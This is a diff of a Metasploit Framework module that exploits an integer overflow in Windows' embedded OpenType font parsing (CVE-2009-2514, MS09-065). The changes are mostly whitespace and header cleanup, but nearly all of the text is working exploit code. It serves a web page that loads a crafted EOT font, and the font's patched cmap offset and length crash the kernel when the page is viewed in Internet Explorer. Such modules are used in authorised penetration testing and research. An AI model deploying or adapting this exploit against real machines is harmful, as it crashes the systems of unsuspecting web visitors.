@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -15,75 +11,74 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::Remote::HttpServer::HTML
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
-			'Description'    => %q{
-				This module exploits an integer overflow flaw in the Microsoft Windows Embedded
-			OpenType font parsing code located in win32k.sys. Since the kernel itself parses
-			embedded web fonts, it is possible to trigger a BSoD from a normal web page when
-			viewed with Internet Explorer.
-			},
-			'License'        => MSF_LICENSE,
-			'Author'         => 'hdm',
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2009-2514' ],
-					[ 'MSB', 'MS09-065' ],
-					[ 'OSVDB', '59869']
-				],
-			'DisclosureDate' => 'Nov 10 2009'
-		))
-		register_options([
-			OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.install_root, "data", "exploits", "pricedown.eot")]),
-		], self.class)
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
+      'Description'    => %q{
+        This module exploits an integer overflow flaw in the Microsoft Windows Embedded
+      OpenType font parsing code located in win32k.sys. Since the kernel itself parses
+      embedded web fonts, it is possible to trigger a BSoD from a normal web page when
+      viewed with Internet Explorer.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => 'hdm',
+      'References'     =>
+        [
+          [ 'CVE', '2009-2514' ],
+          [ 'MSB', 'MS09-065' ],
+          [ 'OSVDB', '59869']
+        ],
+      'DisclosureDate' => 'Nov 10 2009'
+    ))
+    register_options([
+      OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.install_root, "data", "exploits", "pricedown.eot")]),
+    ], self.class)
 
-	end
+  end
 
-	def run
-		exploit
-	end
+  def run
+    exploit
+  end
 
-	def on_request_uri(cli, request)
-		@tag ||= Rex::Text.rand_text_alpha(8)
-		@eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']))
+  def on_request_uri(cli, request)
+    @tag ||= Rex::Text.rand_text_alpha(8)
+    @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']))
 
-		if(request.uri =~ /#{@tag}$/)
-			content = @eot.dup
+    if(request.uri =~ /#{@tag}$/)
+      content = @eot.dup
 
-			# Only this table entry seems to trigger the bug
-			cidx = content.index('cmap')
+      # Only this table entry seems to trigger the bug
+      cidx = content.index('cmap')
 
-			# Use an offset and a length that overflow when combined
-			coff = 0xb0000000
-			clen = (0xfffffffe - coff + 0xcc)
+      # Use an offset and a length that overflow when combined
+      coff = 0xb0000000
+      clen = (0xfffffffe - coff + 0xcc)
 
-			# Patch in the modified offset and length values
-			content[cidx + 8, 8] = [ coff, clen ].pack("N*")
+      # Patch in the modified offset and length values
+      content[cidx + 8, 8] = [ coff, clen ].pack("N*")
 
-			# Send the font on its merry way
-			print_status("Sending embedded font...")
-			send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })
-		else
-			var_title = Rex::Text.rand_text_alpha(6 + rand(32))
-			var_body = Rex::Text.rand_text_alpha(64 + rand(32))
-			var_font = Rex::Text.rand_text_alpha(2 + rand(6))
-			var_face = Rex::Text.rand_text_alpha(2 + rand(32))
+      # Send the font on its merry way
+      print_status("Sending embedded font...")
+      send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })
+    else
+      var_title = Rex::Text.rand_text_alpha(6 + rand(32))
+      var_body = Rex::Text.rand_text_alpha(64 + rand(32))
+      var_font = Rex::Text.rand_text_alpha(2 + rand(6))
+      var_face = Rex::Text.rand_text_alpha(2 + rand(32))
 
-			content = %Q|<html><head><title>#{var_title}</title><style type="text/css">
+      content = %Q|<html><head><title>#{var_title}</title><style type="text/css">
 @font-face{ font-family: '#{var_face}';  src: url('#{get_resource}/#{var_font}#{@tag}'); }
 body {
-	font-family: '#{var_face}';
+  font-family: '#{var_face}';
 }
 </style></head><body> #{var_body} </body></html>|
 
-			print_status("Sending HTML page with embedded font...")
-			send_response_html(cli, content, { 'Content-Type' => 'text/html' })
-		end
-	end
+      print_status("Sending HTML page with embedded font...")
+      send_response_html(cli, content, { 'Content-Type' => 'text/html' })
+    end
+  end
 end
 
 =begin
